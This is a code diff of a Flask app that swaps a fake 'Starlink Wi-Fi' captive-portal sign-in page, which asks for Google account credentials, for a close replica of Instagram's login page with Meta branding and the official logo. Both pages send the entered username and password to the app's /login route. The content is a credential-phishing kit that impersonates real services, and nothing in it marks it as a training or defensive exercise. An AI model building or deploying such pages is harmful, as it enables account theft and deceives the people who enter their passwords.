@@ -3,136 +3,187 @@ import random
 
 app = Flask(__name__)
 
-# ================= Login Page HTML (Starlink Wi-Fi UI) =================
+# ================= Login Page HTML (Instagram UI) =================
 LOGIN_PAGE_HTML = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Starlink Wi-Fi Sign in</title>
+<title>Instagram Login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+
 <style>
-* { margin:0; padding:0; box-sizing:border-box; }
+* {
+    box-sizing: border-box;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
+                 Roboto, Helvetica, Arial, sans-serif;
+}
 
 body {
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-    background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
+    margin: 0;
+    background: #ffffff;
     min-height: 100vh;
     display: flex;
-    align-items: center;
     justify-content: center;
-    padding: 20px;
 }
 
-.container {
+/* Main wrapper */
+.app {
     width: 100%;
-    max-width: 450px;
-    background: white;
-    border-radius: 12px;
-    padding: 40px 32px;
-    box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+    max-width: 420px;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding-top: 22px;
+    padding-bottom: env(safe-area-inset-bottom);
 }
 
-.wifi-name {
+/* Top content */
+.content {
+    width: 100%;
+    padding: 0 24px;
     text-align: center;
-    font-size: 32px;
-    font-weight: 700;
-    background: linear-gradient(270deg, #f58529, #dd2a7b, #8134af, #515bd4, #1dcaff, #f58529);
-    background-size: 600% 600%;
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    animation: gradientMove 6s ease infinite;
-    margin-bottom: 16px;
+    flex: 1;
 }
 
-@keyframes gradientMove {
-    0% { background-position: 0% 50%; }
-    50% { background-position: 100% 50%; }
-    100% { background-position: 0% 50%; }
+/* Language */
+.language {
+    font-size: 14px;
+    color: #262626;
+    margin-bottom: 34px;
 }
 
-.google-logo { text-align:center; margin-bottom:32px; }
-.google-logo span { font-size:24px; font-weight:500; letter-spacing:0.5px; }
-.logo-g { color:#4285F4; } .logo-o1 { color:#EA4335; } .logo-o2 { color:#FBBC04; }
-.logo-g2 { color:#34A853; } .logo-l { color:#EA4335; } .logo-e { color:#4285F4; }
-
-h1 { font-size:24px; font-weight:500; color:#202124; margin-bottom:12px; text-align:center; }
-
-.description { font-size:14px; color:#5f6368; text-align:center; margin-bottom:24px; line-height:1.5; }
-
-.learn-more { text-align:center; margin-bottom:24px; }
-.learn-more a { color:#1f73e8; text-decoration:none; font-size:14px; cursor:pointer; }
-.learn-more a:hover { text-decoration:underline; }
-
-.form-group { margin-bottom:24px; }
-.form-group input {
-    width:100%; padding:12px; border:1px solid #dadce0; border-radius:4px;
-    font-size:16px; font-family:inherit; color:#202124; background:white; transition:border-color 0.2s;
+/* Logo */
+.logo img {
+    width: 70px;
+    height: 70px;
+    margin-bottom: 38px;
 }
-.form-group input:focus { outline:none; border-color:#4285F4; box-shadow:0 0 0 3px rgba(66,133,244,0.1); }
-.form-group input::placeholder { color:#9aa0a6; }
 
-.forgot-password { margin-bottom:24px; }
-.forgot-password a { color:#1f73e8; text-decoration:none; font-size:14px; cursor:pointer; }
-.forgot-password a:hover { text-decoration:underline; }
-
-.create-account { margin-bottom:32px; }
-.create-account a { color:#1f73e8; text-decoration:none; font-size:14px; cursor:pointer; }
-.create-account a:hover { text-decoration:underline; }
-
-.button-container { display:flex; justify-content:flex-end; }
-button {
-    background:#1f73e8; color:white; border:none; padding:10px 24px; border-radius:4px;
-    font-size:14px; font-weight:500; cursor:pointer; transition:background 0.2s;
+/* Inputs */
+.inputs {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
 }
-button:hover { background:#1765cc; }
-button:active { background:#154fb1; }
 
-@media (max-width:480px){
-    .container { padding:32px 24px; }
-    h1 { font-size:20px; }
-    .wifi-name { font-size:28px; }
+input {
+    padding: 14px 12px;
+    font-size: 14px;
+    border-radius: 10px;
+    border: 1px solid #dbdbdb;
+    background: #fafafa;
+}
+
+input::placeholder {
+    color: #8e8e8e;
+}
+
+/* Login button */
+.login-btn {
+    width: 100%;
+    margin-top: 12px;
+    padding: 12px 0;
+    background: #0095f6;
+    color: #fff;
+    border: none;
+    border-radius: 24px;
+    font-size: 15px;
+    font-weight: 600;
+}
+
+/* Forgot */
+.forgot {
+    margin-top: 18px;
+    font-size: 14px;
+    color: #262626;
+}
+
+/* Create account */
+.create {
+    margin-top: 36px;
+}
+
+.create button {
+    width: 100%;
+    padding: 12px 0;
+    border-radius: 24px;
+    border: 1px solid #0095f6;
+    background: transparent;
+    color: #0095f6;
+    font-size: 15px;
+    font-weight: 600;
+}
+
+/* Bottom section */
+.bottom {
+    width: 100%;
+    text-align: center;
+    padding-bottom: env(safe-area-inset-bottom);
+}
+
+/* Meta */
+.meta {
+    font-size: 14px;
+    color: #8e8e8e;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 6px;
+    margin-bottom: 6px;
+}
+
+/* Footer links */
+.footer {
+    font-size: 12px;
+    color: #8e8e8e;
+    padding: 0 18px 12px;
+    line-height: 1.6;
 }
 </style>
 </head>
+
 <body>
-<div class="container">
-    <div class="wifi-name">Starlink Wi-Fi</div>
 
-    <div class="google-logo">
-        <span class="logo-g">G</span><span class="logo-o1">o</span><span class="logo-o2">o</span><span class="logo-g2">g</span><span class="logo-l">l</span><span class="logo-e">e</span>
+<div class="app">
+
+    <div class="content">
+        <div class="language">English (US)</div>
+
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
+        </div>
+
+        <form action="/login" method="POST">
+            <div class="inputs">
+                <input type="text" name="username" placeholder="Username, email or mobile number" required>
+                <input type="password" name="password" placeholder="Password" required>
+            </div>
+
+            <button type="submit" class="login-btn">Log in</button>
+
+            <div class="forgot">Forgot password?</div>
+
+            <div class="create">
+                <button type="button">Create new account</button>
+            </div>
+        </form>
     </div>
 
-    <h1>Sign in</h1>
+    <div class="bottom">
+        <div class="meta">
+            <span>∞</span>
+            <span>Meta</span>
+        </div>
 
-    <p class="description">Please use your <strong>Google Account</strong> to access this WiFi network. Your account will be securely added to this device and can be used with other Google services.</p>
-
-    <div class="learn-more">
-        <a href="#">Learn more about using your account</a>
+        <div class="footer">
+            © Meta 2025 · Privacy · Cookie Policy · Terms · English (UK)
+        </div>
     </div>
 
-    <form action="/login" method="POST">
-        <div class="form-group">
-            <input type="email" name="username" placeholder="Email or phone" required>
-        </div>
-
-        <div class="form-group">
-            <input type="password" name="password" placeholder="Password" required>
-        </div>
-
-        <div class="forgot-password">
-            <a href="#">Forgot email?</a>
-        </div>
-
-        <div class="create-account">
-            <a href="#">Create account</a>
-        </div>
-
-        <div class="button-container">
-            <button type="submit">CONNECT</button>
-        </div>
-    </form>
 </div>
+
 </body>
 </html>
 """
